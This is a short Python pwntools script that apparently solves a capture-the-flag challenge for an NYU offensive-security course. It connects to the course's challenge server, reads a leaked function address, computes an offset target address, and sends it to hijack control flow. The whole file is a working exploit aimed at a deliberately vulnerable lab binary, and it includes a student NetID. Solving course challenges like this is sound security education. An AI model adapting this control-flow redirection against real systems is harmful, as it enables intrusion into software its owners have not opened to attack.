from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "basic_math"
PORT = 1245
NETID = b"os2178"
LOCAL = False

if LOCAL:
	p = process(CHALLENGE)
else:
	p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
	p.recvuntil(b"NetID (something like abc123): ")
	p.sendline(NETID)
	p.recvuntil(b"somewhere: ")
	
functionOffset = "0x1249"
addOffset = "0x1285"

functionAddress = p.recvuntil(b"\n").strip()
functionAddress = functionAddress[::-1]
functionAddress = "0x" + functionAddress.hex()

addAddress = hex(int(functionAddress, 16) - int(functionOffset, 16) + int(addOffset, 16))

addAddress = addAddress[2:]
addAddress = "0000" + addAddress
addAddress = bytes.fromhex(addAddress)
addAddress = addAddress[::-1]

print(addAddress)

print(p.recvuntil(b"> ").decode())
p.sendline(addAddress)
p.interactive()